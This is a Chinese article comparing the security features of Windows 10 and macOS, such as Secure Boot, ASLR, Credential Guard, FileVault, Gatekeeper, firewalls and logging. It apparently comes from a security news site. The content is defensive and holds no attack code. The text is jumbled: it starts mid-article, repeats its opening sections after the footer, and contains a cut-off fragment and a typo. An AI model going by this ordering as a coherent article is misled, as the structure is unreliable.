这一点由登录身份验证来实现，通常包括口令、生物特征识别、 数字证书和其他多因子身份验证设备，比如智能卡和 USB 身 份验证令牌。用户登录后的登录凭证防护也特别重要，无论 临时还是永久，不管存储在内存中还是磁盘上，登录凭证必 须保护好，以防恶意凭证窃取和重用攻击。
Windows 10 对口令策略、生物特征识别、多因子身份验证和数 字证书身份验证都支持良好。微软最新最安全的登录功能是 Windows Hello，支持人脸识别和指纹识别，可在让用户便捷登录 的同时以安全数字证书技术保护用户的登录凭证安全。用户仍然 可以使用口令或更短些的PIN码，不过只能作为设置了更为传统的 身份验证方法之后的备用选项。Windows Hello 也可用于启用了 该功能的应用，比如Dropbox和口令管理器。
由于担心内存凭证盗窃，微软创建了 Virtualization Based Security (基于虚拟化的安全:VBS)，将登录凭证保护在基于硬件 的操作系统虚拟化子集中，几乎不可能受到恶意攻击的影响。 VBS也被称为 Virtual Secure Mode (虚拟安全模式:VSM)。
微软基于 VBS 创建了 Windows Defender Credential Guard 和 Device Guard。Credential Guard保护多种类型的登录凭证，包 括 NTLM、Kerberos 和其他存在 Windows 凭证管理器中基于域的 非 Web 凭证。Credential Guard 挫败了很多流行口令攻击。想要 启用 Credential Guard，必须得是 64 位的 Windows 系统，且开启 了 UEFI、TPM(推荐，但非必需)、Secure Boot，并且处理器是带 有恰当的虚拟化扩展的英特尔或 AMD 处理器。
一直以来，黑客都会利用存储的服务凭证来入侵计算机和网络。 Windows Vista 引入了 Virtual Service Accounts (虚拟服务账户)和 Managed Service Accounts (组管理服务账户:需要开启活动目 录)。二者都是仅用于服务的新身份类型，一旦初始化，就会接管 随机化服务账户口令和定期修改的麻烦事，以便即使服务账户口 令被盗也不会给公司造成太大损失。
macOS:
可设置固件口令以防止从非指定启动盘启动机器，而且固件口令 还会忽略标准启动组合键。但要注意:FileVault 和固件口令保护 都要使用强口令;如果用了弱口令还被黑客猜解出来，那整颗硬 盘上的内容也就在手握正确凭证的人面前裸奔了。
2017年底推出的 iMac Pro 是第一批搭载了T2芯片集的苹果产 品，特定功能可通过新的 Startup Security Utility (启动安全使用程 序)进行修改。通过整合固件口令保护、Secure Boot 和 External Boot (外部启动)到单一接口，该实用程序令Mac机抵御非授权访 问更加简单易行。Mac机用户可通过该接口设置操作系统使用和 更新包及第三方软件安装的严格程度。
4. 提权防范 Windows 10:
黑客或恶意软件一旦在系统中建立了桥头堡，往往会尝试额外的 提权攻击以获取最高管理权限。Windows Defender Exploit Guard 中包含的缓解措施，就是微软提权攻击防范的第一道防线。不 过，微软防范提权攻击的方法不止这一个。
Vista中引入的 User Account Control (用户账户控制:UAC)，就 试图“降级”特权用户(比如管理员账户)在执行标准用户任务时的权 限，比如读取电子邮件或打开浏览器上网之类的普通操作就用不 到管理员权限。如果某用户以特权凭证登录，UAC会将其权限分 割成2个令牌:一个具有特权，另一个没有。默认情况下所有应用 和任务都以非特权令牌执行，除非用户被要求提权或执行的是需 要提权的预定义任务。最开始的时候，很多用户和管理员都觉得 UAC特别烦人。如今，大多数用户启用UAC模式也不会觉得受太 多干扰了。
macOS:
苹果操作系统上创建的用户账户大多是管理员账户。以这些用户 名和口令登录系统，能安装 App 或修改可影响整个系统的设置 项。幸运的是，macOS 内置了避免初级用户用管理员权限犯傻的 保护措施，比如删除 /System 文件夹或其内容这种事就是默认禁 止的。甚至即便无意中以管理员权限安装了恶意软件，内置 System Integrity Protection (系统完整性保护)也能作为故障保护机 制防止恶意软件把操作系统搞崩。
macOS也并非没有漏洞:几个月前刚曝出苹果最新版操作系统无 需口令就能以root权限登录，当然这个漏洞刚被曝光就很快打上 了补丁。虽然该漏洞被快速修复，但也提醒了我们，公众认知中 天生防黑的苹果机，也只是暂时的，漏洞利用随时可能出现。
5. 数据保护 Windows 10:
如果不能保护数据，OS 安全也就没有意义了。微软⻓期以来都有 文件及文件夹加密 ( Encrypting File System ) 功能，并在 Vista 里 添加了以 BitLocker 实现的磁盘卷加密。终极加密密钥可以存储在 TPM 硬件芯片、网络、可移动媒体和其他地方。Vista 之后的 Windows系统增加了其他加密功能和选项，包括使用 BitLocker To Go 对可移动媒体加密和要求可移动媒体必须加密。通过设置 加密选项，系统管理员可以规划什么样的可移动媒体能够在本机 安装并使用。 macOS:
如前文提到的，macOS可用 FileVault 2 加密启动盘以防止未授权 访问。通过固件口令，Mac 机可设置为不能从外部设备启动。 FileVault 2 采用 128 位块大小的 AES 256 加密算法 AES-XTS 模式 进行加密。配合可防止以组合键绕过启动盘启动的固件口令，经 FileVault 2 以强口令整盘加密的磁盘基本上是不可能被破解的。
如果磁盘被转到另一台 Mac 机，可以使用恢复密钥，或者用户有 解锁权限也行。恢复密钥可保存在管理系统里，比如 JAMF，或 者存储在苹果的 iCloud 服务器上躲在 Apple ID 保护之后也可以。
可以使用 macOS 原生 Disk Utility 应用来加密外部磁盘或创建加 密磁盘镜像。 6. 文件完整性保护
Windows 10:
Windows有很多功能都可以为OS和用户数据文件提供完整性保 护。Windows ME 引入了名为 System File Protection (系统文件 保护:SFP)的OS文件保护进程。一旦系统重要文件被删除，SFP 可确保Windows系统能立即以已知良性的文件副本加以替换。 Windows Vista 对SFP进行了升级，演变成还能保护重要Windows 注册表设置的 Windows Resource Protection (Windows资源保护) ——虽然被保护和自动替换的东⻄整体减小了。
Vista还引入了 Mandatory Integrity Controls (强制完整性控制: MIC)和文件及注册表虚拟化。MIC会为Windows中每个用户、文 件和进程显式分配MIC级别(高、中、低)，低级别MIC对象不能修 改高级别MIC对象。在文件和注册表虚拟化保护下，大多数OS重 要文件和注册表设置都可抵御低权限用户或进程的修改尝试，低 权限用户或进程所做的修改只作用于虚拟出来的额外文件或注册 表副本，真正的系统重要文件和注册表设置是不受影响的。
在 Windows 8 中，PC Reset (PC重置)和 PC Refresh (PC刷新)功 能可供用户重置设备到全新状态 ( PC Reset ) 或近全新状态 ( PC Refresh:保留用户文件、设置和某些应用)。如果你担心中了恶意 软件，最好将系统重置到已知干净状态。
macOS:
2015年 El Capitan 中引入的 System Integrity Protection (系统完 整性保护:SIP)，解决的是恶意软件或黑客获取到账户凭证后的 无限制root权限问题。SIP保护特定重要文件和目录的内容和权 限，即便以root执行也无法动作。未签名的内核扩展在SIP保护下 无法运行;如果没有特定权益，进程代码注入和实时代码修改也 无法实现。只有经恰当签名的应用才可以修改受保护的系统目 录，而这些应用必须关联开发者ID，且具备苹果签发的权益。 7. 加密支持
Windows 10:
从 Windows Vista 开始，微软不再尝试自主研发加密密码和算 法，转而部署广受推崇的密码体制 (比如 ECC 和 SHA-2)，并经常 加以更新以防弱密码攻击和支持新兴加密算法。
macOS:
T2芯片使用硬件加密的 Secure Enclave (安全⻜地)存储Mac的加 密密钥(传给同一块芯片上的硬件加密引擎处理)。T2芯片集还控制 着2块用于存储的NAND闪存，包含了实时无损加/解密数据的专用 AES加密硬件。
T2芯片集在Mac机启动过程中确保操作系统软件不被破坏。在启 动时，T2芯片接管启动过程，用其硬件加密的 Secure Enclave 来 比对密钥，加载引导程序，确保其有效性，验证固件，然后验证 让 Mac 机真正跑起来的内核和驱动程序。 8. 磁盘/数据备份和恢复
Windows 10:
每个版本的 Windows 都有多种备份和恢复文件的方法。自 Windows XP 开始，用户可使用 System Restore (系统恢复)功能 将 OS 和各种设置恢复到之前保存的 OS 版本。“先前版本”功能在 Windows XP 时代还只是可选项，到了 Windows 8 就已内置进系 统，可以从之前保存的版本中恢复出个别文件——只要之前的“先 前版本”保存过程覆盖了这些文件。
从 Windows 8 开始，就可以使用名为 File History (文件历史)的备 份及恢复功能了。虽然不是完整的系统备份，File History 却往往 正好是用户所需的，尤其是在 Windows 操作系统已经可以单独恢 复的情况下。File History 默认备份用户最常用于保存文件和配置 的地方，比如“我的文档”、“音乐”、“文档”、“视频”、“桌面”、“下 载”和“应用数据”等，但是用户也可自行纳入或排除文件及文件夹 并制定备份日程。
macOS:
2007年开始，Mac机就预装了 Time Machine (时光机)服务，让备 份过程简单易行，设置好后就再也不用管了。如果 Time Machine 尚未设置，插入硬盘就会弹出设置对话框，供用户将该硬盘设置 为备份目标盘。一旦确认，备份过程即展开。
1天之内的数据按小时保持备份，1个月之内的数据按天保存备 份，1个月之前的数据会被 Time Machine 整合进周备份集合。如 果备份存储空间告急，Time Machine 会删除最早的周备份以匀出 空间。System Preferences (系统偏好设置)中可以修改 Time Machine 的设置。
9. 应用保护
Windows 10:
Windows Vista 开始，微软对应用间互操作和应用对操作系统本 身的操作就管束得特别严格了。Vista在操作系统、服务和终端用 户应用之间进行了严格的隔离。到了 Windows 8，微软又更进一 步，创建了名为Metro的一类防护更严的应用。这类应用最终得名 Modern Applications (现代应用)。 遵循苹果公司的前例，只能通过 Microsoft Store (微软应用商店) 安装经过官方审核通过的 Modern Applications。所有此类应用都 在专⻔的沙箱容器中执行，相互间只有有限的访问权限，与操作 系统的互动也有限，且只有启用了 UAC 才可以执行。
Windows Defender Application Guard 连同Edge浏览器一起随 Windows 10 面世。Edge与其托管的站点和应用如今均在基于 VBS的虚拟环境中运行，与操作系统本身是隔离的。Application Guard 中打开的会话无法启动浏览器扩展，不能保存文件到本地 文件系统，也不能执行其他高⻛险操作。有传言说 Application Guard 将来会支持更多应用。
控制哪些应用能执行哪些不能执行一直以来都是保证高度安全的 有效方式 (比如应用控制、黑名单、白名单)。微软在 Windows XP 中引入了名为 Software Restriction Policies (软件限制策略: SRP) 的应用控制措施。Vista 之后，SRP 被 AppLocker 取代。二 者都可使管理员能够按照名称、位置或数字证书等条件设置程 序、脚本或安装包运行与否。
Windows 10 中，CI和 Device Guard 融进了 Windows Defender Application Control (WDAC)，基于硬件强制实施非常细致具体的 允许或拒绝策略。管理员可以根据自身环境确定适用的应用控制 级别，还能在AppLocker、CI、Device Guard和WDAC中任选。这 些功能将具有恰当的控制级别并在用户权限范围内做出一些操作 上的权衡。
macOS:
领先潜在黑客一步的最简单有效方式就是保持操作系统软件和应 用更新。App 应从可信源下载，比如供应商的主站点，或者更可 信的 Mac App Store。
Mac App Store 存在于 /Applications 应用目录，里面的每个App 都经过了苹果员工的审核并签署有数字证书。一旦App被曝行为 不当，苹果可终止该App。相对其他选择，Mac App Store 是应 用下载最安全的地方了。
但问题是:不是每个应用都能在 Mac App Store 找到，有时候不 得不从第三方站点下载。这个时候，Gatekeeper 就派上用场了。 Gatekeeper是软件数字签名检查器，可以在软件数字签名验证失 败时终止软件的安装过程。App需经苹果代码签名才可以执行， 通过了代码检查的应用就能正确执行。
Gatekeeper在 Security & Privacy System Preference (安全&隐私 系统偏好)面板中设置，有两个App下载源选项:1. App Store (应 用商店);2. App Store 和确定的开发人员。代码检查失败也想安 装软件的时候，Security & Privacy 偏好可手动覆盖，但只有在确 定软件来自可信源的时候才可以这么干。
App沙箱可限制App对系统资源、数据和其他App的访问，也就限 制了恶意软件可能造成的破坏。然而，沙箱的优势也是其劣势， 不是每个应用都支持该功能。很多内置App(包括内置的Web浏览 器Safari)都提供沙箱保护。 macOS High Sierra 中值得一提的另一个安全功能是:应用安装 的任意内核扩展都需要显示授权才可以执行。这可以有效减小恶 意软件偷偷潜入未授权软件中的可能性。
10. 浏览器保护
Windows 10:
微软在 Windows 10 中把 IE 浏览器换成了 Edge。作为一款十分精 简的浏览器，Edge 并未与 IE 共享太多代码。该浏览器不运行传统 高⻛险浏览器插件，只接受来自 Microsoft Store 的经审核扩展， 还具备一键设置重置功能 (以防潜在恶意修改)，并可纳入 Windows Defender Application Guard 模式。
每个网站和下载项都要经过 Windows Defender Smartscreen 筛 选器的评估，该筛选器不仅仅针对浏览器，而是整个 Windows 10 操作系统都适用。Edge的代码量和暴露面均大幅减少，因而 对应用和网站的可执行动作也就限制更严格。相对 IE 而言，可谓 巨大的进步。
macOS:
每部 Mac 都预装了 Safari 浏览器，附带反网络钓⻥技术、防跨站 跟踪设置和链向 iCloud Keychain 密码管理系统的强口令生成器。
11. 网络/无线保护 Windows 10:
微软向来引领网络和无线安全技术潮流。除了⻓期支持无线和网 络标准，微软还常常早期采用这些标准并在大多数用户尚未准备 好之前就加以推出 (比如 IPv6 和 DNSSEC)。⻓期以来，Windows 中内置一项网络防御功能，是任意网络或无线连接的单独管理能 力。Windows 可为每个连接分别配置不同的防火墙、路由器和其 他安全设置。
12. 反恶意软件 Windows 10:
Windows Defender Antivirus 已被证明是顶级无干扰反恶意软件程 序，尤其是以默认状态部署并配合Windows的其他反恶意软功能 使用的时候，比如Smartscreen和Exploit Guard。采用名为 Early Loading Antimalware (早期启动防病毒:ELAM)的功能， Windows可使任意反恶意软件程序先于其他非基本应用，紧跟在 关键 OS 引导进程之后加载。
macOS:
2017年4月，CheckPoint安全研究员发现有恶意软件可绕过 Gatekeeper。5月，流量视频转码器Handbrake被黑，受感染版本 携OSX.PROTON远程访问木⻢散布。攻击越来越复杂，处理潜在 数据泄露的机制也随之越来越复杂。
在 Mac 机上，可路由网络服务默认是禁用的，很多现代应用和服 务也是在沙箱中运行。这意味着 App 和系统服务对系统资源只有 有限访问权;恶意代码不能与其他 App 或系统互操作。 苹果还有更为极端的方式对抗恶意软件。通过静默自动更新，苹 果在每台 Mac 机上都维护着一份已知恶意软件威胁的黑名单。 Safari、Message 和 Mail 下载的每一个文件都附带有元数据，表 明该文件是否安全、文件下载的源地址和下载当时的时间戳。任 何被标为不安全的文件在打开时都会弹出警告信息，用户可选择 直接将该文件投入回收站。
特定程序及任何相关文件都会被自动删除，该程序所做的任何修 改都会被记录并撤销。如果该操作切实发生了，管理员用户下次 登录 Mac 时就会收到“已发生改动”的通知。
13. 防火墙 Windows 10:
自 Windows XP SP2 起，Windows系统便默认安装了一直开启的 Windows Firewall (Windows防火墙)。Windows Firewall 有数十条 内置规则，拒绝一切非例外处理的入站连接，允许用户、组、管 理员、网络、服务或应用创建额外的规则。Windows Firewall 不 对用户产生太多干扰，而且是通用的，也很容易与 IPSEC 一起配 置。唯一的缺点就是糟糕的日志记录 (有时候是太多了) 和缺乏重 大已确认即时安全事件的通告，比如拒绝服务攻击或端口扫描 等，而这些正是其他第三方防火墙通常所具备的。
macOS:
所有 Mac 机发售时都已内置防火墙服务，但默认是关闭的。可通 过 Security & Privacy System Preference (安全&隐私系统偏好)面 板配置该防火墙，可以启用 Stealth Mode (隐身模式)让计算机无 视 ICMP 请求和连接尝试。 14. 远程访问
Windows 10:
虽然微软建议所有远程管理都通过PowerShell或 Microsoft Management Consoles (微软管理控制台:MMC)进行，但 Remote Desktop (远程桌面) 控制台及协议 (RDP) 依然是管理员们 远程访问 Windows 计算机的最常⻅方式。RDP 已历经多次升级， 如今用户可以数字证书身份验证连接，并使用 Windows Defender Credential Guard 保护管理员凭证。
macOS: Mac支持多种远程访问协议，包括对SSH和sftp的原生支持。用户 也可通过 Apple Remote Desktop (苹果远程桌面)远程管理Mac 机，远程屏幕共享则可通过对VNC的原生支持实现，而iCloud订 阅用户还可启用 Back to my Mac (回到我的Mac)从任意一台以相 同 Apple ID 登录的Mac机远程访问自己的Mac。
15. 安全配置
Windows 10:
本地安全策略在 Windows NT 4 SP4 中就已引入，并以 Active Directory Group Policies (活动目录组策略)在 Windows 2000 和 XP 中进行了大幅扩展。今天，没有哪个操作系统像 Windows 一样 有那么多内置的点击式安全配置选项。Windows 操作系统和其他 流行应用 (比如 Office 办公套件) 有数千种安全设置可用。管理员可 用 PowerShell 脚本完成他们可以手动或使用组策略来完成的事 情。
16. 修复
Windows 10:
Windows操作系统和微软应用程序修复是内置并默认开启的。 Windows至少每天都会检查有没有新的补丁，默认自动应用这些 补丁而无需管理员或中断用户的干预。新安装使用一组不容易关 闭的内置硬编码防火墙规则，这些规则可保护PC抵御大多数网络 攻击，同时又可及时获取补丁进行修复。这得感谢2003年的MS- Blaster(冲击波)蠕虫，若非这款让管理员不得不先感染了才能实施 修复的蠕虫，微软的修复策略和过程也不会是现在的样子。 macOS:
苹果一贯在修复重大漏洞利用上反应迅速。
17. 隐私
Windows 10:
背着侵犯终端用户隐私的骂名几十年后，微软如今是隐私权的强 力支持者，提供各种各样的个性设置，管理员或用户可甚为细致 地决定哪些信息可以被收集而哪些不可以。
macOS:
苹果高管一直走在用户隐私问题最前列，某些情况下，为了保护 用户数据，甚至不惜公然与联邦政府对垒。苹果不收集转卖用户 数据，指纹、人脸数据之类安全信息从不漏出苹果设备，苹果的 隐私政策直截了当，令人耳目一新，值得一读。 18. 日志
Windows 10:
根据安装的功能和服务，微软产品有几十种日志文件可供安全分 析。其中最中心的是 Windows Event Log (Windows事件日志)服 务。以前该服务包含 3 个主要日志 (安全日志、系统日志和应用日 志)，如今，其所含日志数量已超 100，且是可配置的 XML 详细日 志。日志或具体事件可以转发给其他收集器并触发控制台消息或 其他应用程序。若说有什么美中不足，那就是记录了太多太多微 不足道的事件。在计算机安全界，噪音太多的问题比缺乏足够的 有用信息更严重。
macOS: 去年推出的 macOS Sierra 引入了统一日志系统，为了提供统一高 效的 API 来捕捉并存储所有系统和应用活动。可配置日志记录不 同程度的细节，这些记录下来的数据可用内置的 Console 应用查 看。
声明:本文来自安全牛，版权归作者所有。文章内容仅代表作者独立观 点，不代表安全内参立场，转载目的在于传递更多信息。如有侵权，请联 系 anquanneican@163.com。
安全运营
相关资讯
中国大数据被黑市垄断，正规玩家年收入不到50亿
大数据 财经杂志 2018-01-20 数据交易产业难以快速爆发，很大一部分原因是数据交易本身的特殊 性。
俄罗斯2018年数字资产联邦监管法律(草案)概要一览 金融 网络犯罪工作坊 2018-02-02 2018年1月15日，俄罗斯财政部出台关于数字资产管制和ICO的联邦 法律草案。
                      UEBA在企业安全领域应用的现状和挑战
安全建设 安全内参 2018-02-07
很多人以为 UEBA 的难点是在于算法本身，其实并不是，这个方法已 经很成熟了，难的是对业务的理解，具体算法技术...
评论(0)
登录后才能发表评论，请先 登录 / 注册
               关于我们
联系我们
用户协议
    移动客户端
  安全内参 © 2019 沪 ICP 备 19008222 号-1
  首⻚ 产业趋势 专家观察 CSO论道 决策研究 登录
APP下载
Windows 10与macOS:18个安全特
性大比拼
安全运营 安全牛 2018-04-13
            摘要:全球两大主流操作系统是怎么保护系统和数据不受恶意软件、未授 权访问、硬件漏洞等等威胁的侵害的呢? 一句“PHP 是世界上最好的编程语言”可以成功惹毛一票程序员。 同样，随口一句“Windows 系统比 Mac 系统更安全(或反之)”也 能让 IT 安全人员吵个不可开交。事实上，只要保持默认安全设置 并遵从其最佳实践建议，这两个操作系统都足够安全，但在几十 年的用户争夺战之后，这个话题已经演变成了技术信仰问题。两 方阵营针锋相对，没有中间路线可走。老好人似的说“两个操作系 统都安全”不过是成为双方共同的敌人而已。
话虽如此，却不是每个人都知道这两种最流行的操作系统到底因 为什么而安全。于是，排除掉那些附加的企业功能，我们不妨先 就操作系统本身带有的基本安全功能来做一番概述和比较。  0. 操作系统基本安全能力 微软 Windows 10 安全
Windows诞生的头10年，这款微软旗舰产品轻易坐稳史上最好攻 击操作系统(OS)的宝座。成功攻击的数量让公众对Windows的安 全性失去了信任。于是，微软共同创始人比尔·盖茨在2002年1月 15日写下了著名的“可信计算”备忘录，指引微软投入更多资源到 提升Windows安全性上。 微软不仅让 Windows 从出厂时就更安全，还创新或协作创新了数 十项计算机安全技术。盖茨 2002 备忘录的最重要成果之一，就是 安全开发生命周期 (SDL) 的大规模采用。SDL 让每个软件开发项目 从一开始就引入安全编码和安全实践。这是安全教育、安全要求 和安全工具的结合，而微软将其经验全部共享了出来。
SDL大幅减小了每千行代码的漏洞率，增加了很多安全功能和选 择，缩小了攻击界面，提供了更安全的默认设置。Windows 10 的安全性，正是微软提供适度安全的跨设备通用操作系统工作的 延续。
苹果 MacOS 安全 很⻓时间以来，Mac 用户都无需担心病毒和恶意软件。现实世界 中，Mac 操作系统的漏洞极少有被利用的。Mac 用户也经常被提 醒注意潜在安全威胁，但大部分时候不过是因为其用 Windows 的 同事成为了恶意软件的攻击目标。每版 Windows 中那数不清的漏 洞，再加上 Windows 那庞大的用户基础，令 PC 成为了黑客的最 佳攻击目标。
直到今天，Mac 系统的潜在威胁情况仍不像其他平台那般严峻， 但 Mac 用户已经不能再无视被黑的可能性了。随着时间流逝，随 着越来越多的苹果设备进入消费市场，威胁只会越来越多，越来 越复杂高端。
其实，苹果设备威胁已经初露端倪:2017 年是安全事件爆发的一 年。2月，虚假 Adobe Flash 安装包内嵌 MacDownloader 恶意软 件，可致 Keychain 数据 (包含用户名和口令等个人信息) 渗漏。去 年秋天，最新 Mac 操作系统 High Sierra 的发售版中检测到数个漏 洞，可令黑客绕过口令获取特定区域的 root 权限。之后不久，名 为“幽灵”和“熔断”的处理器漏洞曝光，世界上大部分计算机都受影 响。
1. 启动保护
Windows 10: 在预启动、启动和启动后防护上，微软一直走在前列。其中一些 防护措施是从其他开源操作系统项目中借鉴过来的，有些则来自 于业界倡议，但大多是微软自主研发的。如今，微软将很多保护 技术都纳入了 Windows Defender System Guard 旗下，启动保护 就是其中的“Secure Boot(安全启动)”。
Secure Boot 要求预启动过程检查计算机是否在主板上安装并启 用了更安全的最新版统一可扩展固件接口(UEFI)和可信平台模块 (TPM)。这两个芯片在接受新代码或设置变更之前都会进行加密验 证，验证不通过就不允许写入和修改，还能加密评估和验证启动 过程。前期验证过的组件往往会安全存储下后面组件之前被验证 过的散列值，只有二者匹配，启动过程才会继续。微软也将该启 动过程称为 “Measured Boot(测量启动)”或“ Trusted Boot(可信启 动)”。
只要有东⻄ (比如 rootkit) 试图修改该预启动或 OS 启动过程，这两 个芯片之一就会收到警报，要么阻止修改，要么在用户下次开机 时给出重要警告。如果你还记得之前有关 rootkit 和引导病毒的大 量报道，并且想知道为什么我们如今好像不太听说此类威胁了， 那答案就是如今我们有了 Secure Boot 之类的预启动和启动保护 过程。这可谓是对黑客和恶意软件作战中少有的几个大成功之 一。
UEFI和TPM都是开放标准，任何厂商或OS可用。UEFI替代了容 易出漏洞的BIOS，TPM则托管着核心加密功能——包括关键系统 密钥的安全存储。用了 UEFI 和 TPM，OS 供应商就能更好地维护 其 OS 产品及其他应用 (比如数据存储加密) 在机器启动时和启动后 的完整性。
Windows还有个名为“可配置代码完整性(CI)”的功能，可保证在可 信启动过程完成后只有预先定义过的可信代码能够运行。CI是通 用OS在只执行可信代码方面的重大进步，但微软已测试通过的操 作之外的那些普通操作想要合理运用CI，还得经过慎重的计划和 测试。不过，如果想尽可能保证Windows操作系统安全，还是可 以借助CI的力量。
在防止黑客使用行业标准预启动 I/O 接口 (比如直接内存存取 (DMA) 或 IEEE 1394) 控制磁盘或设备方面，微软也对其所有 OS 版 本进行了改进。对每一家 OS 供应商来说，在不严重影响运行速度 或削弱 OS 性能的同时防止这些接口被恶意使用，确实是一项巨大 的挑战。微软不仅增强了预启动 I/O 接口防护，还更进一步，允许 实质上已成 OS 本身一部分的设备驱动程序可以按设备单独安装。
Windows 10 还引入了设备健康认证(DHA)的改进版。DHA可认证 操作系统，使其干干净净地启动，还可对其他进程进行执行前的 验证。健康检查中包含什么内容取决于OS、OS管理员和他们使 用的DHA服务。客户可自己进行DHA检查，也可以将之外包给微 软或第三方提供商。 macOS:
苹果采用了防护能力弱得多的 UEFI 早期版本——EFI 1.0，而没有 采用后来更安全的 UEFI 新版本。但是，苹果自主研发了其他很多 类似的专利防护技术。因为是专利技术，苹果并未公布其相关细 节，很难就其预启动和启动防护措施进行对比分析。
不过，Mac 上可以启用多个启动防护，尤其能够防止别人访问 Mac 硬盘上的数据。标准用户账户口令可提供对正确启动的 Mac 机的基本保护，但防不住能接触到 Mac 机且具备“目标磁盘模式” 知识的黑客。
为防止未授权访问，启动盘可用 FileVault 2 加密，而 Mac 可以设 置成不能通过固件口令从外部设备启动。FileVault 2 采用 AES 256 加密算法进行整盘加密，块大小 128 位，AWS-XTS 模式，可 阻止无解锁权限的账户看到磁盘上的任何内容。 片集整合了一系列硬件子系统，并引入了一些最终会用在其他 Mac 机上的安全功能。
2. 内存保护
Windows 10:
微软在内存保护上做了很多工作，通常是为了防止初步漏洞利 用、零日漏洞和提权攻击。大多数内存保护措施都纳入到了 Windows Defender Exploit Guard 中，其中很多都来自于之前被 称作“增强缓解体验工具包 (EMET)”的漏洞利用防护附件。
数据执行保护 (DEP) 自 Windows XP 时代就已出现。DEP 旨在防 止恶意缓冲区溢出，也就是阻止恶意程序将可执行代码放到数据 区并诱骗 OS 执行该代码。DEP 能令 OS 拒不执行标记为数据区域 里的任何东⻄。
Windows Vista引入了很多新的安全特性，比如“地址空间布局随 机化(ASLR)”、“结构化错误处理复写保护(SEHOP)”和“受保护进 程”。ASLR会在每次启动时为通用关键系统进程分配不同的内存 空间，让想操纵并修改这些进程的恶意程序更难以找到它们。 SEHOP会在发现执行错误时停止恶意流氓程序的安装或执行过 程。这些安全功能连同其他预防性技术演进成了微软现在所谓的 Control Flow Guard (控制流保护)。微软的每个程序都启用了该保 护措施，Visual Studio 15 之类的编程工具也可使用该安全功能。
EMET在Vista中就已引入，作为帮助防止零日攻击的附加组件。 该工具包含了内存保护、数字证书处理改进(比如证书锁定)、早期 警告和攻击上报改进(向OS管理员和微软报告攻击情况，以便发现 新攻击的技术细节)。EMET演化出了15种以上的缓解措施，其经 验证的保护功能备受推崇，所以微软将其整合进了 Windows 10 Creator Update 中(以 Windows Defender Exploit Guard 的姿态出 现 )。
macOS:
Mac机在英特尔处理器中内置了XD(执行禁用)功能，防止用于数 据存储和可执行指令存储的内存相互访问。恶意软件常会利用数 据内存和指令内存间的相互访问来入侵系统，但XD的存在为此类 恶意行为设置了障碍。
Mac机的macOS内核同样应用了ASLR，通过随机分配目标地址让 攻击者难以定位应用程序漏洞。基本上，只要启用了ASLR，黑客 就更容易直接搞崩要利用的应用，而不是获得应用权限来作恶。 3. 登录/身份验证
Windows 10:
OS一旦启动起来，最重要的安全功能就是限制谁能登录了。这一 点由登录身份验证来实现，通常包括口令、生物特征识别、数字 证书和其他多因子身份验证设备，比如智能卡和USB身份验证令 牌。用户登录后的登录凭证防护也特别重要，无论临时还是永 久，不管存储在内存中还是磁盘上，登录凭证必须保护好，以防 恶意凭证窃取和重用攻击。
Windows 10 对口令策略、生物特征识别、多因子身份验证和数 字证书身份验证都支持良好。微软最新最安全的登录功能是 Windows Hello，支持人脸识别和指纹识别，可在让用户便捷登录 的同时以安全数字证书技术保护用户的登录凭证安全。用户仍然 可以使用口令或更短些的PIN码，不过只能作为设置了更为传统的 身份验证方法之后的备用选项。Windows Hello 也可用于启用了 该功能的应用，比如Dropbox和口令管理器。
由于担心内存凭证盗窃，微软创建了 Virtualization Based Security (基于虚拟化的安全:VBS)，将登录凭证保护在基于硬件 的操作系统虚拟化子集中，几乎不可能受到恶意攻击的影响。 VBS也被称为 Virtual Secure Mode (虚拟安全模式:VSM)。
微软基于 VBS 创建了 Windows Defender Credential Guard 和 Device Guard。Credential Guard保护多种类型的登录凭证，包 括 NTLM、Kerberos 和其他存在 Windows 凭证管理器中基于域的 非 Web 凭证。Credential Guard 挫败了很多流行口令攻击。想要 启用 Credential Guard，必须得是 64 位的 Windows 系统，且开启 了 UEFI、TPM(推荐，但非必需)、Secure Boot，并且处理器是带 有恰当的虚拟化扩展的英特尔或 AMD 处理器。
一直以来，黑客都会利用存储的服务凭证来入侵计算机和网络。 Windows Vista 引入了 Virtual Service Accounts (虚拟服务账户)和 Managed Service Accounts (组管理服务账户:需要开启活动目 录)。二者都是仅用于服务的新身份类型，一旦初始化，就会接管 随机化服务账户口令和定期修改的麻烦事，以便即使服务账户口 令被盗也不会给公司造成太大损失。
macOS:
可设置固件口令以防止从非指定启动盘启动机器，而且固件口令 还会忽略标准启动组合键。但要注意:FileVault 和固件口令保护 都要使用强口令;如果用了弱口令还被黑客猜解出来，那整颗硬 盘上的内容也就在手握正确凭证的人面前裸奔了。 2017年底推出的 iMac Pro 是第一批搭载了T2芯片集的苹果产 品，特定功能可通过新的 Startup Security Utility (启动安全使用程 序)进行修改。通过整合固件口令保护、Secure Boot 和 External Boot (外部启动)到单一接口，该实用程序令Mac机抵御非授权访 问更加简单易行。Mac机用户可通过该接口设置操作系统使用和 更新包及第三方软件安装的严格程度。
4. 提权防范
Windows 10:
黑客或恶意软件一旦在系统中建立了桥头堡，往往会尝试额外的 提权攻击以获取最高管理权限。Windows Defender Exploit Guard 中包含的缓解措施，就是微软提权攻击防范的第一道防线。不 过，微软防范提权攻击的方法不止这一个。
Vista中引入的 User Account Control (用户账户控制:UAC)，就 试图“降级”特权用户(比如管理员账户)在执行标准用户任务时的权 限，比如读取电子邮件或打开浏览器上网之类的普通操作就用不 到管理员权限。如果某用户以特权凭证登录，UAC 会将其权限分 割成 2 个令牌:一个具有特权，另一个没有。默认情况下所有应 用和任务都以非特权令牌执行，除非用户被要求提权或执行的是 需要提权的预定义任务。最开始的时候，很多用户和管理员都觉 得 UAC 特别烦人。如今，大多数用户启用 UAC 模式也不会觉得受 太多干扰了。
macOS:
苹果操作系统上创建的用户账户大多是管理员账户。以这些用户 名和口令登录系统，能安装 App 或修改可影响整个系统的设置 项。幸运的是，macOS 内置了避免初级用户用管理员权限犯傻的 保护措施，比如删除 /System 文件夹或其内容这种事就是默认禁 止的。甚至即便无意中以管理员权限安装了恶意软件，内置 System Integrity Protection (系统完整性保护)也能作为故障保护 机制防止恶意软件把操作系统搞崩。
macOS也并非没有漏洞:几个月前刚曝出苹果最新版操作系统无 需口令就能以root权限登录，当然这个漏洞刚被曝光就很快打上 了补丁。虽然该漏洞被快速修复，但也提醒了我们，公众认知中 天生防黑的苹果机，也只是暂时的，漏洞利用随时可能出现。
5. 数据保护 Windows 10:
